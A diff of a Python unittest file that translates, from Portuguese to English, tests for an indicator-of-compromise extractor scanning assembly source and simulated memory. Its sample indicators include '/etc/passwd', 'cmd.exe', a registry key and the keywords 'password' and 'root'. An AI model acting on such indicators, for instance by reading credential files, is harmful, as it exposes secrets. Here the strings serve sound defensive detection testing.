+        source = 'a db "cmd.exe"\nb db "cmd.exe"\n'
+        values = [(ioc.kind, ioc.value, ioc.line) for ioc in extract(source)]
+        self.assertEqual(values, [("command", "cmd.exe", 1), ("extension", ".exe", 1)])
 
-    def test_comentarios_podem_ser_excluidos(self) -> None:
-        fonte = 'db "ok"\n; http://x.org/a\n'
-        self.assertEqual(values_of("url", fonte), ["http://x.org/a"])
-        self.assertEqual(values_of("url", fonte, include_comments=False), [])
+    def test_comments_can_be_excluded(self) -> None:
+        source = 'db "ok"\n; http://x.org/a\n'
+        self.assertEqual(values_of("url", source), ["http://x.org/a"])
+        self.assertEqual(values_of("url", source, include_comments=False), [])
 
-    def test_min_length_vale_para_a_classificacao(self) -> None:
+    def test_min_length_applies_to_classification(self) -> None:
         self.assertEqual(values_of("keyword", 'db "root"', min_length=5), [])
         self.assertEqual(values_of("keyword", 'db "root"', min_length=4), ["root"])
 
-    def test_linha_e_o_numero_da_linha_do_fonte(self) -> None:
-        fonte = 'section .data\n\nmsg db "http://x.org/a"\n'
-        self.assertEqual(extract(fonte)[0].line, 3)
+    def test_line_is_the_source_line_number(self) -> None:
+        source = 'section .data\n\nmsg db "http://x.org/a"\n'
+        self.assertEqual(extract(source)[0].line, 3)
 
-    def test_contexto_sem_espacos_duplicados(self) -> None:
-        fonte = 'msg    db    "http://x.org/a"        ; nota'
-        self.assertEqual(extract(fonte)[0].context, 'msg db "http://x.org/a" ; nota')
+    def test_context_without_duplicate_spaces(self) -> None:
+        source = 'msg    db    "http://x.org/a"        ; note'
+        self.assertEqual(extract(source)[0].context, 'msg db "http://x.org/a" ; note')
 
-    def test_ordem_por_linha_e_por_categoria(self) -> None:
-        fonte = 'a db "/etc/passwd"\nb db "http://x.org/a"\n'
+    def test_order_by_line_and_kind(self) -> None:
+        source = 'a db "/etc/passwd"\nb db "http://x.org/a"\n'
         self.assertEqual(
-            [(ioc.line, ioc.kind) for ioc in extract(fonte)], [(1, "path_unix"), (2, "url")]
+            [(ioc.line, ioc.kind) for ioc in extract(source)], [(1, "path_unix"), (2, "url")]
         )
 
-    def test_todas_as_categorias_saem_de_ioc_kinds(self) -> None:
-        fonte = (
+    def test_all_kinds_come_from_ioc_kinds(self) -> None:
+        source = (
             'db "http://x.org/a", 0\n'
             'db "10.0.0.1", 0\n'
-            'db "exemplo.com", 0\n'
-            'db "a@exemplo.com", 0\n'
+            'db "example.com", 0\n'
+            'db "a@example.com", 0\n'
             'db "/etc/passwd", 0\n'
             'db "C:\\\\Windows", 0\n'
             'db "HKLM\\\\Software", 0\n'
             'db "cmd.exe", 0\n'
             'db "x.enc", 0\n'
-            'db "senha", 0\n'
-            'db "texto comum", 0\n'
+            'db "password", 0\n'
+            'db "plain text", 0\n'
         )
-        self.assertEqual(set(kinds_of(fonte)), set(IOC_KINDS))
-        for ioc in extract(fonte):
+        self.assertEqual(set(kinds_of(source)), set(IOC_KINDS))
+        for ioc in extract(source):
             self.assertIn(ioc.kind, IOC_KINDS)
             self.assertEqual(ioc.to_dict()["label"], IOC_KINDS[ioc.kind])
 
 
-class TestGroupEToDicts(unittest.TestCase):
-    """O agrupamento e a conversão para dicionário."""
+class TestGroupAndToDicts(unittest.TestCase):
+    """The grouping and the conversion to a dictionary."""
 
-    def test_group_sem_repetir_valor(self) -> None:
+    def test_group_without_repeating_value(self) -> None:
         iocs = [
             Ioc("url", "http://x.org/a", 1),
             Ioc("url", "http://x.org/a", 2),
             Ioc("url", "http://x.org/b", 3),
         ]
-        agrupado = group(iocs)
+        grouped = group(iocs)
         self.assertEqual(
-            [ioc.value for ioc in agrupado["url"]], ["http://x.org/a", "http://x.org/b"]
+            [ioc.value for ioc in grouped["url"]], ["http://x.org/a", "http://x.org/b"]
         )
-        self.assertEqual(agrupado["url"][0].line, 1)
+        self.assertEqual(grouped["url"][0].line, 1)
 
-    def test_group_na_ordem_de_ioc_kinds(self) -> None:
-        iocs = [Ioc("string", "texto", 1), Ioc("url", "http://x.org/a", 2)]
+    def test_group_in_ioc_kinds_order(self) -> None:
+        iocs = [Ioc("string", "text", 1), Ioc("url", "http://x.org/a", 2)]
         self.assertEqual(list(group(iocs)), ["url", "string"])
 
-    def test_group_de_lista_vazia(self) -> None:
+    def test_group_of_empty_list(self) -> None:
         self.assertEqual(group([]), {})
         self.assertEqual(to_dicts([]), {})
 
-    def test_to_dicts_traz_o_rotulo_em_portugues(self) -> None:
-        convertido = to_dicts([Ioc("ipv4", "10.0.0.1", 4, "db 10.0.0.1")])
+    def test_to_dicts_brings_the_label(self) -> None:
+        converted = to_dicts([Ioc("ipv4", "10.0.0.1", 4, "db 10.0.0.1")])
         self.assertEqual(
-            convertido["ipv4"][0],
+            converted["ipv4"][0],
             {
                 "kind": "ipv4",
                 "value": "10.0.0.1",
                 "line": 4,
                 "context": "db 10.0.0.1",
-                "label": "Endereço IPv4",
+                "label": "IPv4 address",
             },
         )
 
-    def test_to_dict_do_ioc(self) -> None:
-        dicionario: Dict[str, Any] = Ioc("url", "http://x.org", 7).to_dict()
-        self.assertEqual(sorted(dicionario), ["context", "kind", "label", "line", "value"])
-        self.assertEqual(dicionario["label"], "URL")
+    def test_ioc_to_dict(self) -> None:
+        dictionary: Dict[str, Any] = Ioc("url", "http://x.org", 7).to_dict()
+        self.assertEqual(sorted(dictionary), ["context", "kind", "label", "line", "value"])
+        self.assertEqual(dictionary["label"], "URL")
 
-    def test_ioc_e_imutavel(self) -> None:
+    def test_ioc_is_immutable(self) -> None:
         ioc = Ioc("url", "http://x.org", 1)
         with self.assertRaises(dataclasses.FrozenInstanceError):
             ioc.value = "outro"  # type: ignore[misc]
 
-    def test_todas_as_categorias_tem_rotulo(self) -> None:
+    def test_all_kinds_have_a_label(self) -> None:
         for kind in IOC_KINDS:
             with self.subTest(kind=kind):
                 self.assertTrue(IOC_KINDS[kind])
@@ -572,133 +572,133 @@ class TestGroupEToDicts(unittest.TestCase):
 
 
 class TestSummary(unittest.TestCase):
-    """O resumo de uma linha."""
+    """The one-line summary."""
 
-    def test_resumo_com_varias_categorias(self) -> None:
+    def test_summary_with_several_kinds(self) -> None:
         iocs = [
             Ioc("url", "http://x.org/a", 1),
             Ioc("url", "http://x.org/b", 2),
             Ioc("ipv4", "10.0.0.1", 3),
             Ioc("path_unix", "/etc/passwd", 4),
         ]
-        self.assertEqual(summary(iocs), "4 indicador(es): 2 URL, 1 IPv4, 1 caminho")
+        self.assertEqual(summary(iocs), "4 indicator(s): 2 URL, 1 IPv4, 1 path")
 
-    def test_resumo_de_um_so(self) -> None:
-        self.assertEqual(summary([Ioc("url", "http://x.org", 1)]), "1 indicador(es): 1 URL")
+    def test_summary_of_a_single_one(self) -> None:
+        self.assertEqual(summary([Ioc("url", "http://x.org", 1)]), "1 indicator(s): 1 URL")
 
-    def test_resumo_vazio(self) -> None:
-        self.assertEqual(summary([]), "0 indicador(es)")
+    def test_empty_summary(self) -> None:
+        self.assertEqual(summary([]), "0 indicator(s)")
 
-    def test_resumo_do_extract(self) -> None:
-        resumo = summary(extract('db "cmd.exe"'))
-        self.assertTrue(resumo.startswith("2 indicador(es): 1 comando"))
-        self.assertIn("1 extensão", resumo)
+    def test_summary_from_extract(self) -> None:
+        summary_text = summary(extract('db "cmd.exe"'))
+        self.assertTrue(summary_text.startswith("2 indicator(s): 1 command"))
+        self.assertIn("1 extension", summary_text)
 
 
 class TestFromMemory(unittest.TestCase):
-    """A varredura de strings na memória simulada."""
+    """The string scan in the simulated memory."""
 
-    def test_acha_string_simples(self) -> None:
-        self.assertIn("Ola, mundo!", [ioc.value for ioc in from_memory(LeitorFalso(MEMORIA))])
+    def test_finds_simple_string(self) -> None:
+        self.assertIn("Hello, world!", [ioc.value for ioc in from_memory(FakeReader(MEMORY))])
 
-    def test_classifica_url(self) -> None:
-        self.assertIn("https://exemplo.com/x", values_memoria("url"))
+    def test_classifies_url(self) -> None:
+        self.assertIn("https://example.com/x", memory_values("url"))
 
-    def test_classifica_palavra_chave(self) -> None:
-        self.assertIn("password", values_memoria("keyword"))
+    def test_classifies_keyword(self) -> None:
+        self.assertIn("password", memory_values("keyword"))
 
-    def test_classifica_ip(self) -> None:
-        self.assertIn("1.2.3.4", values_memoria("ipv4"))
+    def test_classifies_ip(self) -> None:
+        self.assertIn("1.2.3.4", memory_values("ipv4"))
 
-    def test_todas_as_linhas_sao_zero(self) -> None:
-        for ioc in from_memory(LeitorFalso(MEMORIA)):
+    def test_all_lines_are_zero(self) -> None:
+        for ioc in from_memory(FakeReader(MEMORY)):
             self.assertEqual(ioc.line, 0)
             self.assertTrue(ioc.context)
 
     def test_min_length(self) -> None:
-        self.assertEqual(from_memory(LeitorFalso(MEMORIA), min_length=25), [])
+        self.assertEqual(from_memory(FakeReader(MEMORY), min_length=25), [])
 
-    def test_nao_repete_valor(self) -> None:
-        dados = b"http://x.org/a\x00http://x.org/a\x00"
-        self.assertEqual(len(from_memory(LeitorFalso(dados))), 1)
+    def test_does_not_repeat_value(self) -> None:
+        data = b"http://x.org/a\x00http://x.org/a\x00"
+        self.assertEqual(len(from_memory(FakeReader(data))), 1)
 
-    def test_sem_read_cstring_devolve_vazio(self) -> None:
-        self.assertEqual(from_memory(LeitorSemCstring()), [])
+    def test_without_read_cstring_returns_empty(self) -> None:
+        self.assertEqual(from_memory(NoCstringReader()), [])
 
-    def test_leitor_quebrado_nao_levanta(self) -> None:
-        self.assertEqual(from_memory(LeitorQuebrado()), [])
+    def test_broken_reader_does_not_raise(self) -> None:
+        self.assertEqual(from_memory(BrokenReader()), [])
 
-    def test_leitor_so_com_read_mem(self) -> None:
-        self.assertIn("Ola, mundo!", [ioc.value for ioc in from_memory(LeitorSoMemoria(MEMORIA))])
+    def test_reader_with_only_read_mem(self) -> None:
+        self.assertIn("Hello, world!", [ioc.value for ioc in from_memory(MemoryOnlyReader(MEMORY))])
 
-    def test_leitor_so_com_read_cstring(self) -> None:
-        self.assertIn("Ola, mundo!", [ioc.value for ioc in from_memory(LeitorSoCstring(MEMORIA))])
+    def test_reader_with_only_read_cstring(self) -> None:
+        self.assertIn(
+            "Hello, world!", [ioc.value for ioc in from_memory(CstringOnlyReader(MEMORY))]
+        )
 
-    def test_memoria_vazia(self) -> None:
-        self.assertEqual(from_memory(LeitorFalso(b"\x00" * 64)), [])
+    def test_empty_memory(self) -> None:
+        self.assertEqual(from_memory(FakeReader(b"\x00" * 64)), [])
 
-    def test_memoria_binaria(self) -> None:
-        self.assertEqual(from_memory(LeitorFalso(bytes(range(1, 20)) * 4)), [])
+    def test_binary_memory(self) -> None:
+        self.assertEqual(from_memory(FakeReader(bytes(range(1, 20)) * 4)), [])
 
-    def test_objeto_qualquer_devolve_vazio(self) -> None:
+    def test_any_object_returns_empty(self) -> None:
         self.assertEqual(from_memory(object()), [])
         self.assertEqual(from_memory(None), [])
 
-    def test_janela_de_varredura(self) -> None:
-        dados = b"primeiro\x00segundo\x00"
-        self.assertEqual(
-            [ioc.value for ioc in from_memory(LeitorFalso(dados), size=9)], ["primeiro"]
-        )
+    def test_scan_window(self) -> None:
+        data = b"first\x00second\x00"
+        self.assertEqual([ioc.value for ioc in from_memory(FakeReader(data), size=9)], ["first"])
 
     def test_size_zero(self) -> None:
-        self.assertEqual(from_memory(LeitorFalso(MEMORIA), size=0), [])
+        self.assertEqual(from_memory(FakeReader(MEMORY), size=0), [])
 
-    def test_base_diferente(self) -> None:
-        leitor = LeitorFalso(b"outro texto\x00", base=0x1000)
-        self.assertEqual([ioc.value for ioc in from_memory(leitor, base=0x1000)], ["outro texto"])
+    def test_different_base(self) -> None:
+        reader = FakeReader(b"other text\x00", base=0x1000)
+        self.assertEqual([ioc.value for ioc in from_memory(reader, base=0x1000)], ["other text"])
 
 
-class TestExemplos(unittest.TestCase):
-    """Os exemplos do pacote passam pelo extrator."""
+class TestExamples(unittest.TestCase):
+    """The examples of the package go through the extractor."""
 
-    def test_linux_hello_traz_ola_mundo(self) -> None:
+    def test_linux_hello_brings_hello_world(self) -> None:
         iocs = extract(EXAMPLES["linux-hello"]["code"])
-        self.assertIn("Ola, mundo!", [ioc.value for ioc in iocs if ioc.kind == "string"])
+        self.assertIn("Hello, world!", [ioc.value for ioc in iocs if ioc.kind == "string"])
 
-    def test_windows_hello_traz_as_strings_de_console(self) -> None:
+    def test_windows_hello_brings_the_console_strings(self) -> None:
         iocs = extract(EXAMPLES["windows-hello"]["code"])
-        valores = [ioc.value for ioc in iocs if ioc.kind == "string"]
-        self.assertIn("Ola do Windows!", valores)
-        # O exemplo não cita caminho do Windows nenhum: nada de ``C:\``.
+        values = [ioc.value for ioc in iocs if ioc.kind == "string"]
+        self.assertIn("Hello from Windows!", values)
+        # The example cites no Windows path at all: no ``C:\``.
         self.assertEqual([ioc.value for ioc in iocs if ioc.kind == "path_windows"], [])
 
-    def test_quebrado_traz_a_mensagem_com_acento(self) -> None:
-        valores = [ioc.value for ioc in extract(EXAMPLES["quebrado"]["code"])]
-        self.assertIn("Ação inválida", valores)
-        self.assertIn("rafael", valores)
+    def test_broken_brings_the_message(self) -> None:
+        values = [ioc.value for ioc in extract(EXAMPLES["broken"]["code"])]
+        self.assertIn("Invalid action", values)
+        self.assertIn("rafael", values)
 
-    def test_gcc_att_nao_tem_indicador(self) -> None:
+    def test_gcc_att_has_no_indicator(self) -> None:
         self.assertEqual(extract(EXAMPLES["gcc-att"]["code"]), [])
 
-    def test_todos_os_exemplos_sao_classificaveis(self) -> None:
-        for nome, exemplo in EXAMPLES.items():
-            with self.subTest(exemplo=nome):
-                iocs = extract(exemplo["code"])
-                convertido = to_dicts(iocs)
+    def test_all_examples_are_classifiable(self) -> None:
+        for name, example in EXAMPLES.items():
+            with self.subTest(example=name):
+                iocs = extract(example["code"])
+                converted = to_dicts(iocs)
                 for ioc in iocs:
                     self.assertIn(ioc.kind, IOC_KINDS)
                     self.assertGreaterEqual(ioc.line, 1)
-                for kind, lista in convertido.items():
+                for kind, items in converted.items():
                     self.assertIn(kind, IOC_KINDS)
-                    self.assertTrue(lista)
+                    self.assertTrue(items)
                 self.assertTrue(summary(iocs))
 
-    def test_strings_of_dos_exemplos_mantem_o_tamanho_minimo(self) -> None:
-        for nome, exemplo in EXAMPLES.items():
-            with self.subTest(exemplo=nome):
-                for linha, texto in strings_of(exemplo["code"]):
-                    self.assertGreaterEqual(linha, 1)
-                    self.assertGreaterEqual(len(texto.strip()), 4)
+    def test_strings_of_examples_keep_the_minimum_size(self) -> None:
+        for name, example in EXAMPLES.items():
+            with self.subTest(example=name):
+                for line, text in strings_of(example["code"]):
+                    self.assertGreaterEqual(line, 1)
+                    self.assertGreaterEqual(len(text.strip()), 4)
 
 
 if __name__ == "__main__":
